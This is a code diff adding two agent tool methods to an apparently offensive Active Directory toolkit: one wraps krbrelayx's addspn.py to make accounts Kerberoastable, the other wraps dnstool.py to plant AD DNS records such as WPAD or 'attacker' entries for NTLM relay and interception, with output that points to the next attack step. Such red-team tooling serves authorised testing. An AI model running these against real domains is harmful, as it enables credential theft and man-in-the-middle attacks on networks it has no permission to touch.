@@ -974,6 +974,185 @@ class DelegationTools(Toolset):
         except Exception as e:
             return f"KrbRelayUp failed: {e}"
 
+    @dn.tool_method
+    def addspn(
+        self,
+        target_account: str,
+        spn: str,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+        action: str = "add",
+    ) -> str:
+        """
+        Add or remove Service Principal Names (SPNs) on target accounts.
+
+        SPNs are required for Kerberoasting - adding an SPN to a user account
+        makes it targetable for Kerberos TGS extraction. This is useful for:
+        - Setting up targeted Kerberoast attacks on high-value accounts
+        - Preparing accounts for constrained delegation attacks
+
+        Args:
+            target_account: Account to modify (e.g., 'svc_admin' or 'svc_admin$')
+            spn: SPN to add (e.g., 'http/evil.contoso.local')
+            domain: Target domain
+            username: User with write permissions on target account
+            password: Password for authentication
+            dc_ip: Domain controller IP
+            action: 'add' to add SPN, 'remove' to remove it
+
+        Returns:
+            Result of SPN modification
+
+        Example:
+            >>> addspn("svc_admin", "http/evil.contoso.local", "contoso.local", "user", "pass", "192.168.58.10")
+        """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        # addspn.py from krbrelayx toolkit
+        cmd = [
+            "python3",
+            "/opt/krbrelayx/addspn.py",
+            "-u",
+            f"{domain}/{username}",
+            "-p",
+            resolved_password or "",
+            "-t",
+            target_account,
+            "-s",
+            spn,
+            "--dc-ip",
+            dc_ip,
+        ]
+
+        if action.lower() == "remove":
+            cmd.append("--remove")
+
+        try:
+            action_str = "Adding" if action.lower() != "remove" else "Removing"
+            logger.info(f"[*] {action_str} SPN {spn} on {target_account}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if returncode == 0 or "success" in result.lower():
+                logger.info(f"[+] SPN modification successful: {spn} on {target_account}")
+                if action.lower() != "remove":
+                    result = (
+                        f"✅ SPN ADDED: {spn} on {target_account}\n"
+                        f"→ Account is now Kerberoastable\n"
+                        f"→ Use kerberoast to extract TGS hash\n"
+                        f"→ Or use for delegation attacks\n\n" + result
+                    )
+                else:
+                    result = f"✅ SPN REMOVED: {spn} from {target_account}\n\n" + result
+
+            return result
+
+        except Exception as e:
+            return f"addspn failed: {e}"
+
+    @dn.tool_method
+    def dnstool(
+        self,
+        dc_ip: str,
+        domain: str,
+        username: str,
+        password: str,
+        record_name: str,
+        record_data: str,
+        record_type: str = "A",
+        action: str = "add",
+    ) -> str:
+        """
+        Add, modify, or remove DNS records in Active Directory DNS.
+
+        DNS manipulation is essential for relay attacks - adding records that
+        point to your listener enables NTLM coercion and relay scenarios.
+
+        Common uses:
+        - Add A record pointing to attacker IP for MITM
+        - Set up WPAD records for proxy attacks
+        - Create records for coercion attack destinations
+
+        Args:
+            dc_ip: Domain controller IP (DNS server)
+            domain: Target domain
+            username: User with DNS write permissions
+            password: Password for authentication
+            record_name: DNS record name (e.g., 'attacker' for attacker.contoso.local)
+            record_data: Record data (IP for A records, hostname for CNAME)
+            record_type: Record type - 'A' (default), 'AAAA', 'CNAME'
+            action: 'add' to add, 'remove' to remove, 'modify' to update
+
+        Returns:
+            Result of DNS modification
+
+        Example:
+            >>> dnstool("192.168.58.10", "contoso.local", "user", "pass", "attacker", "192.168.58.50")
+            >>> dnstool("192.168.58.10", "contoso.local", "user", "pass", "wpad", "192.168.58.50")
+        """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        # dnstool.py from krbrelayx toolkit
+        cmd = [
+            "python3",
+            "/opt/krbrelayx/dnstool.py",
+            "-u",
+            f"{domain}\\{username}",
+            "-p",
+            resolved_password or "",
+            "-r",
+            record_name,
+            "-d",
+            record_data,
+            "-t",
+            record_type.upper(),
+            dc_ip,
+        ]
+
+        # Map action to dnstool flags
+        if action.lower() == "add":
+            cmd.append("-a")
+            cmd.append("add")
+        elif action.lower() == "remove":
+            cmd.append("-a")
+            cmd.append("delete")
+        elif action.lower() == "modify":
+            cmd.append("-a")
+            cmd.append("modify")
+        else:
+            return f"[!] Unknown action: {action}. Use 'add', 'remove', or 'modify'."
+
+        try:
+            logger.info(
+                f"[*] {action.title()} DNS {record_type} record: {record_name} -> {record_data}"
+            )
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if returncode == 0 or "success" in result.lower():
+                logger.info("[+] DNS record modification successful")
+                if action.lower() == "add":
+                    fqdn = f"{record_name}.{domain}" if "." not in record_name else record_name
+                    result = (
+                        f"✅ DNS RECORD ADDED\n"
+                        f"→ {record_type} record: {fqdn} -> {record_data}\n"
+                        f"→ Use this for relay attacks or coercion\n"
+                        f"→ Start listener on {record_data} before coercing\n\n" + result
+                    )
+
+            return result
+
+        except Exception as e:
+            return f"dnstool failed: {e}"
+
 
 class CertipyTools(Toolset):
     """Tools for AD Certificate Services (ADCS) enumeration and exploitation.
